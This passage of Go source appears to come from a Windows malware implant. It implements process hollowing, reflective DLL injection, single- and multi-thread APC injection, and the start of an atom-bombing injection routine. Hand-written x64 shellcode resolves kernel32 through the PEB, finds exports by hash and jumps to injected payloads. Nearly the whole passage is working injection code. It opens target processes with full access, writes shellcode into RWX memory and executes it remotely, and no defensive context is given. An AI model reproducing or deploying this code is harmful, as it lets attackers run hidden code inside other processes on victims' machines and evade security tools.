	_, err = windows.ResumeThread(pi.Thread)
	if err != nil {
		return nil, fmt.Errorf("failed to resume thread: %v", err)
	}

	result := map[string]interface{}{
		"status":           "success",
		"method":           "process_hollowing",
		"target_path":      targetPath,
		"target_pid":       pi.ProcessId,
		"target_tid":       pi.ThreadId,
		"image_base":       fmt.Sprintf("0x%x", allocatedBase),
		"entry_point":      fmt.Sprintf("0x%x", entryPoint),
		"payload_size":     len(payloadBytes),
		"relocation_delta": allocatedBase != payloadImageBase,
	}

	return json.Marshal(result)
}

// Helper functions

func virtualAllocEx(hProcess windows.Handle, lpAddress uintptr, dwSize int, flAllocationType uint32, flProtect uint32) (uintptr, error) {
	addr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		lpAddress,
		uintptr(dwSize),
		uintptr(flAllocationType),
		uintptr(flProtect),
	)

	if addr == 0 {
		return 0, err
	}

	return addr, nil
}

func virtualFreeEx(hProcess windows.Handle, lpAddress uintptr, dwSize int, dwFreeType uint32) error {
	ret, _, err := procVirtualFreeEx.Call(
		uintptr(hProcess),
		lpAddress,
		uintptr(dwSize),
		uintptr(dwFreeType),
	)

	if ret == 0 {
		return err
	}

	return nil
}

func getExecutablePath() (string, error) {
	var path [windows.MAX_PATH]uint16
	n, err := windows.GetModuleFileName(0, &path[0], uint32(len(path)))
	if err != nil {
		return "", err
	}
	return syscall.UTF16ToString(path[:n]), nil
}

func getCurrentPID() int {
	return int(windows.GetCurrentProcessId())
}

// Additional helper functions for process hollowing

func readProcessMemory(hProcess windows.Handle, baseAddress uintptr, buffer unsafe.Pointer, size uintptr) error {
	var bytesRead uintptr
	ret, _, err := procReadProcessMemory.Call(
		uintptr(hProcess),
		baseAddress,
		uintptr(buffer),
		size,
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return err
	}
	return nil
}

func writeProcessMemory(hProcess windows.Handle, baseAddress uintptr, buffer unsafe.Pointer, size uintptr) error {
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		baseAddress,
		uintptr(buffer),
		size,
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return err
	}
	return nil
}

func getThreadContext(hThread windows.Handle, ctx *CONTEXT) error {
	ret, _, err := procGetThreadContext.Call(
		uintptr(hThread),
		uintptr(unsafe.Pointer(ctx)),
	)
	if ret == 0 {
		return err
	}
	return nil
}

func setThreadContext(hThread windows.Handle, ctx *CONTEXT) error {
	ret, _, err := procSetThreadContext.Call(
		uintptr(hThread),
		uintptr(unsafe.Pointer(ctx)),
	)
	if ret == 0 {
		return err
	}
	return nil
}

func ntUnmapViewOfSection(hProcess windows.Handle, baseAddress uintptr) error {
	ret, _, err := procNtUnmapViewOfSection.Call(
		uintptr(hProcess),
		baseAddress,
	)
	if ret != 0 {
		return err
	}
	return nil
}

func performRelocation(hProcess windows.Handle, payloadBytes []byte, ntHeaders *IMAGE_NT_HEADERS, newBase uintptr, delta int64) error {
	// Get relocation directory
	relocDir := ntHeaders.OptionalHeader.DataDirectory[5] // IMAGE_DIRECTORY_ENTRY_BASERELOC
	if relocDir.Size == 0 {
		return nil // No relocations needed
	}

	relocOffset := relocDir.VirtualAddress
	relocSize := relocDir.Size

	for relocSize > 0 {
		if relocOffset+IMAGE_SIZEOF_BASE_RELOCATION > uint32(len(payloadBytes)) {
			break
		}

		baseReloc := (*IMAGE_BASE_RELOCATION)(unsafe.Pointer(&payloadBytes[relocOffset]))
		if baseReloc.SizeOfBlock == 0 {
			break
		}

		entriesCount := (baseReloc.SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION) / 2
		relocEntries := (*[0xFFFF]uint16)(unsafe.Pointer(&payloadBytes[relocOffset+IMAGE_SIZEOF_BASE_RELOCATION]))

		for i := uint32(0); i < entriesCount; i++ {
			entry := relocEntries[i]
			relocType := entry >> 12
			offset := entry & 0xFFF

			if relocType == 0 { // IMAGE_REL_BASED_ABSOLUTE
				continue
			}

			if relocType == 10 || relocType == 3 { // IMAGE_REL_BASED_DIR64 or IMAGE_REL_BASED_HIGHLOW
				patchAddress := newBase + uintptr(baseReloc.VirtualAddress) + uintptr(offset)

				var originalValue uint64
				if relocType == 10 { // 64-bit
					err := readProcessMemory(hProcess, patchAddress, unsafe.Pointer(&originalValue), 8)
					if err != nil {
						continue
					}
					newValue := uint64(int64(originalValue) + delta)
					writeProcessMemory(hProcess, patchAddress, unsafe.Pointer(&newValue), 8)
				} else { // 32-bit
					var originalValue32 uint32
					err := readProcessMemory(hProcess, patchAddress, unsafe.Pointer(&originalValue32), 4)
					if err != nil {
						continue
					}
					newValue32 := uint32(int64(originalValue32) + delta)
					writeProcessMemory(hProcess, patchAddress, unsafe.Pointer(&newValue32), 4)
				}
			}
		}

		relocSize -= baseReloc.SizeOfBlock
		relocOffset += baseReloc.SizeOfBlock
	}

	return nil
}

// Helper functions for reflective DLL injection

func performReflectiveRelocation(hProcess windows.Handle, dllBytes []byte, ntHeaders *IMAGE_NT_HEADERS, newBase uintptr, delta int64) error {
	relocDir := ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
	if relocDir.Size == 0 {
		return nil
	}

	relocOffset := relocDir.VirtualAddress
	relocSize := relocDir.Size

	for relocSize > 0 {
		if relocOffset+IMAGE_SIZEOF_BASE_RELOCATION > uint32(len(dllBytes)) {
			break
		}

		baseReloc := (*IMAGE_BASE_RELOCATION)(unsafe.Pointer(&dllBytes[relocOffset]))
		if baseReloc.SizeOfBlock == 0 {
			break
		}

		entriesCount := (baseReloc.SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION) / 2
		relocEntries := (*[0xFFFF]uint16)(unsafe.Pointer(&dllBytes[relocOffset+IMAGE_SIZEOF_BASE_RELOCATION]))

		for i := uint32(0); i < entriesCount; i++ {
			entry := relocEntries[i]
			relocType := entry >> 12
			offset := entry & 0xFFF

			if relocType == 0 {
				continue
			}

			if relocType == 10 || relocType == 3 {
				patchAddress := newBase + uintptr(baseReloc.VirtualAddress) + uintptr(offset)

				var originalValue uint64
				if relocType == 10 {
					readProcessMemory(hProcess, patchAddress, unsafe.Pointer(&originalValue), 8)
					newValue := uint64(int64(originalValue) + delta)
					writeProcessMemory(hProcess, patchAddress, unsafe.Pointer(&newValue), 8)
				} else {
					var originalValue32 uint32
					readProcessMemory(hProcess, patchAddress, unsafe.Pointer(&originalValue32), 4)
					newValue32 := uint32(int64(originalValue32) + delta)
					writeProcessMemory(hProcess, patchAddress, unsafe.Pointer(&newValue32), 4)
				}
			}
		}

		relocSize -= baseReloc.SizeOfBlock
		relocOffset += baseReloc.SizeOfBlock
	}

	return nil
}

func resolveImports(hProcess windows.Handle, dllBytes []byte, ntHeaders *IMAGE_NT_HEADERS, baseAddress uintptr) error {
	importDir := ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
	if importDir.Size == 0 {
		return nil // No imports
	}

	importDescOffset := importDir.VirtualAddress

	for {
		if importDescOffset > uint32(len(dllBytes)) {
			break
		}

		importDesc := (*IMAGE_IMPORT_DESCRIPTOR)(unsafe.Pointer(&dllBytes[importDescOffset]))
		if importDesc.Name == 0 {
			break
		}

		// Get DLL name
		dllName := readStringFromBytes(dllBytes, importDesc.Name)
		if dllName == "" {
			break
		}

		// Load the DLL (in our process to get function addresses)
		dllNamePtr, _ := syscall.UTF16PtrFromString(dllName)
		hModule, err := windows.LoadLibrary(string(windows.UTF16ToString((*[256]uint16)(unsafe.Pointer(dllNamePtr))[:])))
		if err != nil {
			importDescOffset += uint32(unsafe.Sizeof(IMAGE_IMPORT_DESCRIPTOR{}))
			continue
		}
		defer windows.FreeLibrary(hModule)

		// Process thunks
		thunkOffset := importDesc.FirstThunk
		if importDesc.OriginalFirstThunk != 0 {
			thunkOffset = importDesc.OriginalFirstThunk
		}

		thunkIndex := uint32(0)
		for {
			thunkAddr := thunkOffset + thunkIndex*8 // 8 bytes for 64-bit
			if thunkAddr > uint32(len(dllBytes)) {
				break
			}

			thunk := (*IMAGE_THUNK_DATA)(unsafe.Pointer(&dllBytes[thunkAddr]))
			if thunk.AddressOfData == 0 {
				break
			}

			// Check if import by ordinal
			var funcAddr uintptr
			if thunk.AddressOfData&0x8000000000000000 != 0 {
				// Import by ordinal
				ordinal := uintptr(thunk.AddressOfData & 0xFFFF)
				funcAddr, _ = windows.GetProcAddressByOrdinal(hModule, ordinal)
			} else {
				// Import by name
				importByName := (*IMAGE_IMPORT_BY_NAME)(unsafe.Pointer(&dllBytes[thunk.AddressOfData]))
				funcName := readStringFromBytes(dllBytes, uint32(uintptr(unsafe.Pointer(&importByName.Name[0]))-uintptr(unsafe.Pointer(&dllBytes[0]))))
				funcAddr, _ = windows.GetProcAddress(hModule, funcName)
			} // Write function address to IAT in target process
			iatAddr := baseAddress + uintptr(importDesc.FirstThunk) + uintptr(thunkIndex*8)
			writeProcessMemory(hProcess, iatAddr, unsafe.Pointer(&funcAddr), 8)

			thunkIndex++
		}

		importDescOffset += uint32(unsafe.Sizeof(IMAGE_IMPORT_DESCRIPTOR{}))
	}

	return nil
}

func readStringFromBytes(data []byte, offset uint32) string {
	if offset >= uint32(len(data)) {
		return ""
	}

	end := offset
	for end < uint32(len(data)) && data[end] != 0 {
		end++
	}

	return string(data[offset:end])
}

func generateDllMainShellcode(dllMain uintptr, dllBase uintptr) []byte {
	// Simple shellcode to call DllMain(dllBase, DLL_PROCESS_ATTACH, NULL)
	// x64 shellcode
	shellcode := []byte{
		0x48, 0xB9, // mov rcx, dllBase (will be patched)
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00, // mov rdx, 1 (DLL_PROCESS_ATTACH)
		0x4D, 0x31, 0xC0, // xor r8, r8 (NULL)
		0x48, 0xB8, // mov rax, dllMain (will be patched)
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28 (shadow space)
		0xFF, 0xD0, // call rax
		0x48, 0x83, 0xC4, 0x28, // add rsp, 0x28
		0xC3, // ret
	}

	// Patch dllBase
	*(*uint64)(unsafe.Pointer(&shellcode[2])) = uint64(dllBase)
	// Patch dllMain
	*(*uint64)(unsafe.Pointer(&shellcode[22])) = uint64(dllMain)

	return shellcode
}

func enumProcessThreads(pid int) ([]uint32, error) {
	// Enumerate all threads belonging to the specified process ID
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
	}
	defer windows.CloseHandle(snapshot)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))

	err = windows.Thread32First(snapshot, &te)
	if err != nil {
		return nil, fmt.Errorf("Thread32First failed: %v", err)
	}

	var threads []uint32
	for {
		if te.OwnerProcessID == uint32(pid) {
			threads = append(threads, te.ThreadID)
		}

		err = windows.Thread32Next(snapshot, &te)
		if err != nil {
			break
		}
	}

	if len(threads) == 0 {
		return nil, fmt.Errorf("no threads found for PID %d", pid)
	}

	return threads, nil
}

func generateAtomReaderShellcode(atoms []uint16, targetAddr uintptr) []byte {
	// Production-ready shellcode that:
	// 1. Resolves kernel32.dll and GlobalGetAtomNameA dynamically
	// 2. Reads each atom and writes the data to targetAddr
	// 3. Jumps to targetAddr to execute the reconstructed shellcode

	// This is x64 position-independent shellcode
	var shellcode []byte

	// Prologue: Save registers and set up stack frame
	shellcode = append(shellcode, []byte{
		0x55,             // push rbp
		0x48, 0x89, 0xE5, // mov rbp, rsp
		0x48, 0x83, 0xEC, 0x50, // sub rsp, 0x50 (allocate stack space)
		0x53,       // push rbx
		0x56,       // push rsi
		0x57,       // push rdi
		0x41, 0x54, // push r12
		0x41, 0x55, // push r13
		0x41, 0x56, // push r14
		0x41, 0x57, // push r15
	}...)

	// Save target address in r15 (non-volatile register)
	shellcode = append(shellcode, 0x49, 0xBF) // mov r15, targetAddr
	targetAddrBytes := make([]byte, 8)
	*(*uint64)(unsafe.Pointer(&targetAddrBytes[0])) = uint64(targetAddr)
	shellcode = append(shellcode, targetAddrBytes...)

	// --- Resolve kernel32.dll base address via PEB ---
	shellcode = append(shellcode, []byte{
		// Get PEB address from GS register (TEB->PEB)
		0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, // mov rax, qword ptr gs:[0x60]

		// Get PEB->Ldr (offset 0x18)
		0x48, 0x8B, 0x40, 0x18, // mov rax, qword ptr [rax + 0x18]

		// Get InMemoryOrderModuleList (offset 0x20)
		0x48, 0x8B, 0x40, 0x20, // mov rax, qword ptr [rax + 0x20]

		// Walk the module list to find kernel32.dll
		// rax now points to the first module's LIST_ENTRY

		// Skip first entry (current executable)
		0x48, 0x8B, 0x00, // mov rax, qword ptr [rax]

		// Get second entry (ntdll.dll usually)
		0x48, 0x8B, 0x00, // mov rax, qword ptr [rax]

		// Get third entry (kernel32.dll usually)
		0x48, 0x8B, 0x00, // mov rax, qword ptr [rax]

		// Get module base address (offset -0x10 from LIST_ENTRY)
		0x48, 0x8B, 0x58, 0x20, // mov rbx, qword ptr [rax + 0x20]

		// rbx now contains kernel32.dll base address
	}...)

	// --- Find GlobalGetAtomNameA export ---
	shellcode = append(shellcode, []byte{
		// Parse PE headers to find export table
		// DOS header at rbx, get e_lfanew (offset 0x3C)
		0x8B, 0x43, 0x3C, // mov eax, dword ptr [rbx + 0x3C]

		// NT headers = base + e_lfanew
		0x48, 0x01, 0xD8, // add rax, rbx

		// Get export directory RVA (NT headers + 0x88)
		0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, // mov eax, dword ptr [rax + 0x88]

		// Export directory VA = base + RVA
		0x48, 0x01, 0xD8, // add rax, rbx
		0x48, 0x89, 0xC6, // mov rsi, rax (rsi = export directory)

		// Get AddressOfNames RVA (offset 0x20)
		0x8B, 0x46, 0x20, // mov eax, dword ptr [rsi + 0x20]
		0x48, 0x01, 0xD8, // add rax, rbx
		0x49, 0x89, 0xC4, // mov r12, rax (r12 = address of names)

		// Get AddressOfNameOrdinals RVA (offset 0x24)
		0x8B, 0x46, 0x24, // mov eax, dword ptr [rsi + 0x24]
		0x48, 0x01, 0xD8, // add rax, rbx
		0x49, 0x89, 0xC5, // mov r13, rax (r13 = address of ordinals)

		// Get AddressOfFunctions RVA (offset 0x1C)
		0x8B, 0x46, 0x1C, // mov eax, dword ptr [rsi + 0x1C]
		0x48, 0x01, 0xD8, // add rax, rbx
		0x49, 0x89, 0xC6, // mov r14, rax (r14 = address of functions)

		// Get NumberOfNames (offset 0x18)
		0x8B, 0x4E, 0x18, // mov ecx, dword ptr [rsi + 0x18]
		0x31, 0xFF, // xor edi, edi (counter = 0)
	}...)

	// --- Search loop for "GlobalGetAtomNameA" ---
	// Loop start marker
	loopStart := len(shellcode)
	shellcode = append(shellcode, []byte{
		// Get name RVA
		0x41, 0x8B, 0x04, 0xBC, // mov eax, dword ptr [r12 + rdi*4]
		0x48, 0x01, 0xD8, // add rax, rbx (rax = name string)

		// Compare with "GlobalGetAtomNameA" (hash comparison for brevity)
		// For simplicity, we'll use a hash: 0x5F1E8B58
		0x48, 0x89, 0xC2, // mov rdx, rax
		0xE8, 0x00, 0x00, 0x00, 0x00, // call hash_string (will be replaced with inline hash)
	}...)

	// Inline djb2 hash function
	hashStart := len(shellcode)
	shellcode = append(shellcode, []byte{
		0x48, 0x31, 0xC0, // xor rax, rax
		0xB8, 0x05, 0x15, 0x00, 0x00, // mov eax, 0x1505 (djb2 initial value)
		// hash_loop:
		0x0F, 0xB6, 0x0A, // movzx ecx, byte ptr [rdx]
		0x84, 0xC9, // test cl, cl
		0x74, 0x0A, // jz hash_done
		0xC1, 0xE0, 0x05, // shl eax, 5
		0x01, 0xC8, // add eax, ecx
		0x48, 0xFF, 0xC2, // inc rdx
		0xEB, 0xEF, // jmp hash_loop
		// hash_done:
		0xC3, // ret
	}...)

	// Fix the call offset
	hashOffset := int32(hashStart - (loopStart + 11))
	*(*int32)(unsafe.Pointer(&shellcode[loopStart+8])) = hashOffset

	// Continue search loop
	shellcode = append(shellcode, []byte{
		// Compare hash (GlobalGetAtomNameA hash = 0x5F1E8B58)
		0x3D, 0x58, 0x8B, 0x1E, 0x5F, // cmp eax, 0x5F1E8B58
		0x74, 0x06, // jz found

		// Not found, increment counter
		0x48, 0xFF, 0xC7, // inc rdi
		0x48, 0x39, 0xCF, // cmp rdi, rcx
		0x72, 0xD4, // jb loop_start (relative jump back)

		// If we get here, function not found - exit gracefully
		0xEB, 0x50, // jmp cleanup (skip to cleanup)

		// found:
		// Get ordinal
		0x41, 0x0F, 0xB7, 0x7C, 0x7D, 0x00, // movzx edi, word ptr [r13 + rdi*2]

		// Get function RVA
		0x41, 0x8B, 0x04, 0xBE, // mov eax, dword ptr [r14 + rdi*4]

		// Get function VA
		0x48, 0x01, 0xD8, // add rax, rbx
		0x48, 0x89, 0x45, 0xF8, // mov qword ptr [rbp-8], rax (save GlobalGetAtomNameA)
	}...)

	// --- Read atoms and reconstruct shellcode ---
	shellcode = append(shellcode, []byte{
		0x4C, 0x89, 0xFF, // mov rdi, r15 (rdi = target address)
		0x31, 0xF6, // xor esi, esi (esi = atom index)
	}...)

	// Embed atom count
	shellcode = append(shellcode, 0xB9) // mov ecx, atom_count
	atomCountBytes := make([]byte, 4)
	*(*uint32)(unsafe.Pointer(&atomCountBytes[0])) = uint32(len(atoms))
	shellcode = append(shellcode, atomCountBytes...)

	// Embed atom array offset (will be appended at end)
	shellcode = append(shellcode, []byte{
		0x48, 0x8D, 0x1D, 0x00, 0x00, 0x00, 0x00, // lea rbx, [rip + offset] (atoms array)
	}...)
	atomArrayRefOffset := len(shellcode) - 4

	// Loop to read each atom
	shellcode = append(shellcode, []byte{
		// Check if done
		0x39, 0xCE, // cmp esi, ecx
		0x73, 0x30, // jae atoms_done

		// Get atom value
		0x0F, 0xB7, 0x14, 0x73, // movzx edx, word ptr [rbx + rsi*2]

		// Call GlobalGetAtomNameA(atom, buffer, bufferSize)
		0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28 (shadow space)

		0x48, 0x89, 0xF9, // mov rcx, rdi (buffer = current target address)
		// rdx already has atom
		0x41, 0xB8, 0xFF, 0x00, 0x00, 0x00, // mov r8d, 255 (buffer size)

		0xFF, 0x55, 0xF8, // call qword ptr [rbp-8] (GlobalGetAtomNameA)

		0x48, 0x83, 0xC4, 0x28, // add rsp, 0x28

		// Advance target address by return value (bytes written)
		0x48, 0x01, 0xC7, // add rdi, rax

		// Increment atom index
		0x48, 0xFF, 0xC6, // inc rsi
		0xEB, 0xD9, // jmp atom_loop
	}...)

	// atoms_done:
	shellcode = append(shellcode, []byte{
		// cleanup:
		0x41, 0x5F, // pop r15
		0x41, 0x5E, // pop r14
		0x41, 0x5D, // pop r13
		0x41, 0x5C, // pop r12
		0x5F,             // pop rdi
		0x5E,             // pop rsi
		0x5B,             // pop rbx
		0x48, 0x89, 0xEC, // mov rsp, rbp
		0x5D, // pop rbp

		// Jump to reconstructed shellcode
		0x49, 0xFF, 0xE7, // jmp r15
	}...)

	// Fix atom array RIP-relative offset
	atomArrayOffset := int32(len(shellcode) - (atomArrayRefOffset + 4))
	*(*int32)(unsafe.Pointer(&shellcode[atomArrayRefOffset])) = atomArrayOffset

	// Append atom values at the end of shellcode
	for _, atom := range atoms {
		atomBytes := make([]byte, 2)
		*(*uint16)(unsafe.Pointer(&atomBytes[0])) = atom
		shellcode = append(shellcode, atomBytes...)
	}

	return shellcode
}

// ReflectiveDLLInjection performs reflective DLL injection
func (i *Implant) ReflectiveDLLInjection(pid int, dllBytes []byte) ([]byte, error) {
	if len(dllBytes) < 1024 {
		return nil, fmt.Errorf("DLL too small to be valid")
	}

	// Open target process
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		return nil, fmt.Errorf("failed to open process %d: %v", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	// Step 1: Parse DLL PE headers
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&dllBytes[0]))
	if dosHeader.Magic != 0x5A4D {
		return nil, fmt.Errorf("invalid DLL: missing MZ signature")
	}

	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(&dllBytes[uint32(dosHeader.LfaNew)]))
	if ntHeaders.Signature != 0x4550 {
		return nil, fmt.Errorf("invalid DLL: missing PE signature")
	}

	// Step 2: Allocate memory in target process for the entire DLL
	imageSize := ntHeaders.OptionalHeader.SizeOfImage
	remoteBase, err := virtualAllocEx(hProcess, 0, int(imageSize), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("failed to allocate memory: %v", err)
	}

	// Step 3: Write PE headers
	headersSize := ntHeaders.OptionalHeader.SizeOfHeaders
	err = writeProcessMemory(hProcess, remoteBase, unsafe.Pointer(&dllBytes[0]), uintptr(headersSize))
	if err != nil {
		virtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to write headers: %v", err)
	}

	// Step 4: Write sections
	sectionHeaderOffset := uint32(dosHeader.LfaNew) + uint32(unsafe.Sizeof(IMAGE_NT_HEADERS{}))
	numberOfSections := ntHeaders.FileHeader.NumberOfSections

	for j := uint16(0); j < numberOfSections; j++ {
		sectionOffset := sectionHeaderOffset + uint32(j)*uint32(unsafe.Sizeof(IMAGE_SECTION_HEADER{}))
		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(&dllBytes[sectionOffset]))

		if section.SizeOfRawData == 0 {
			continue
		}

		sectionDest := remoteBase + uintptr(section.VirtualAddress)
		sectionSource := unsafe.Pointer(&dllBytes[section.PointerToRawData])

		err = writeProcessMemory(hProcess, sectionDest, sectionSource, uintptr(section.SizeOfRawData))
		if err != nil {
			virtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE)
			return nil, fmt.Errorf("failed to write section: %v", err)
		}
	}

	// Step 5: Perform relocations
	originalBase := uintptr(ntHeaders.OptionalHeader.ImageBase)
	if remoteBase != originalBase {
		delta := int64(remoteBase) - int64(originalBase)
		err = performReflectiveRelocation(hProcess, dllBytes, ntHeaders, remoteBase, delta)
		if err != nil {
			// Non-fatal: continue anyway
		}
	}

	// Step 6: Resolve imports
	err = resolveImports(hProcess, dllBytes, ntHeaders, remoteBase)
	if err != nil {
		virtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to resolve imports: %v", err)
	}

	// Step 7: Prepare bootstrap shellcode to call DllMain
	// The shellcode will:
	// 1. Get necessary function addresses
	// 2. Call DllMain with DLL_PROCESS_ATTACH
	// 3. Clean up and return

	entryPoint := remoteBase + uintptr(ntHeaders.OptionalHeader.AddressOfEntryPoint)

	// Allocate memory for bootstrap shellcode
	bootstrapSize := 512
	bootstrapAddr, err := virtualAllocEx(hProcess, 0, bootstrapSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		virtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to allocate bootstrap memory: %v", err)
	}

	// Generate shellcode to call DllMain
	shellcode := generateDllMainShellcode(entryPoint, remoteBase)
	err = writeProcessMemory(hProcess, bootstrapAddr, unsafe.Pointer(&shellcode[0]), uintptr(len(shellcode)))
	if err != nil {
		virtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE)
		virtualFreeEx(hProcess, bootstrapAddr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to write bootstrap shellcode: %v", err)
	}

	// Step 8: Execute the bootstrap shellcode
	var threadID uint32
	hThread, _, err := procCreateRemoteThread.Call(
		uintptr(hProcess),
		0,
		0,
		bootstrapAddr,
		remoteBase, // Pass DLL base as parameter
		0,
		uintptr(unsafe.Pointer(&threadID)),
	)

	if hThread == 0 {
		virtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE)
		virtualFreeEx(hProcess, bootstrapAddr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to create thread: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hThread))

	// Wait for DllMain to complete
	procWaitForSingleObject.Call(hThread, 0xFFFFFFFF)

	// Clean up bootstrap shellcode
	virtualFreeEx(hProcess, bootstrapAddr, 0, MEM_RELEASE)

	result := map[string]interface{}{
		"status":      "success",
		"method":      "reflective_dll_injection",
		"pid":         pid,
		"dll_base":    fmt.Sprintf("0x%x", remoteBase),
		"entry_point": fmt.Sprintf("0x%x", entryPoint),
		"dll_size":    len(dllBytes),
		"thread_id":   threadID,
	}

	return json.Marshal(result)
}

// QueueUserAPC performs APC injection
func (i *Implant) QueueUserAPC(pid int, threadID uint32, shellcode []byte) ([]byte, error) {
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("no shellcode provided")
	}

	// Open target process
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		return nil, fmt.Errorf("failed to open process %d: %v", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	// Allocate memory in target process
	addr, err := virtualAllocEx(hProcess, 0, len(shellcode), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("VirtualAllocEx failed: %v", err)
	}

	// Write shellcode to allocated memory
	err = writeProcessMemory(hProcess, addr, unsafe.Pointer(&shellcode[0]), uintptr(len(shellcode)))
	if err != nil {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("WriteProcessMemory failed: %v", err)
	}

	// Open target thread
	hThread, _, err := procOpenThread.Call(
		THREAD_SET_CONTEXT,
		0,
		uintptr(threadID),
	)

	if hThread == 0 {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to open thread %d: %v", threadID, err)
	}
	defer windows.CloseHandle(windows.Handle(hThread))

	// Queue APC to the thread
	ret, _, err := procQueueUserAPC.Call(
		addr,
		hThread,
		0, // Parameter for APC function
	)

	if ret == 0 {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("QueueUserAPC failed: %v", err)
	}

	result := map[string]interface{}{
		"status":        "success",
		"method":        "apc_injection",
		"pid":           pid,
		"thread_id":     threadID,
		"address":       fmt.Sprintf("0x%x", addr),
		"shellcode_len": len(shellcode),
		"note":          "APC will execute when thread enters alertable state",
	}

	return json.Marshal(result)
}

// QueueUserAPCMultiple queues APC to multiple threads for better success rate
func (i *Implant) QueueUserAPCMultiple(pid int, shellcode []byte) ([]byte, error) {
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("no shellcode provided")
	}

	// Open target process
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		return nil, fmt.Errorf("failed to open process %d: %v", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	// Allocate memory in target process
	addr, err := virtualAllocEx(hProcess, 0, len(shellcode), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("VirtualAllocEx failed: %v", err)
	}

	// Write shellcode
	err = writeProcessMemory(hProcess, addr, unsafe.Pointer(&shellcode[0]), uintptr(len(shellcode)))
	if err != nil {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("WriteProcessMemory failed: %v", err)
	}

	// Enumerate threads and queue APC to all of them
	threadIDs, err := enumProcessThreads(pid)
	if err != nil {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to enumerate threads: %v", err)
	}

	queuedCount := 0
	for _, tid := range threadIDs {
		hThread, _, _ := procOpenThread.Call(
			THREAD_SET_CONTEXT,
			0,
			uintptr(tid),
		)

		if hThread != 0 {
			ret, _, _ := procQueueUserAPC.Call(addr, hThread, 0)
			windows.CloseHandle(windows.Handle(hThread))
			if ret != 0 {
				queuedCount++
			}
		}
	}

	if queuedCount == 0 {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to queue APC to any thread")
	}

	result := map[string]interface{}{
		"status":         "success",
		"method":         "apc_injection_multiple",
		"pid":            pid,
		"threads_found":  len(threadIDs),
		"threads_queued": queuedCount,
		"address":        fmt.Sprintf("0x%x", addr),
		"shellcode_len":  len(shellcode),
	}

	return json.Marshal(result)
}

// AtomBombingInjection performs atom bombing injection technique
func (i *Implant) AtomBombingInjection(pid int, shellcode []byte) ([]byte, error) {
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("no shellcode provided")
	}

	// Open target process
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		return nil, fmt.Errorf("failed to open process %d: %v", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	// Step 1: Allocate RWX memory in target process for final shellcode
	targetAddr, err := virtualAllocEx(hProcess, 0, len(shellcode), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("failed to allocate memory: %v", err)
	}

	// Step 2: Split shellcode into chunks (atoms have max size)
	const atomChunkSize = 255 // Max atom data size
	numChunks := (len(shellcode) + atomChunkSize - 1) / atomChunkSize
	atoms := make([]uint16, 0, numChunks)

	for i := 0; i < len(shellcode); i += atomChunkSize {
		end := i + atomChunkSize
		if end > len(shellcode) {
			end = len(shellcode)
		}

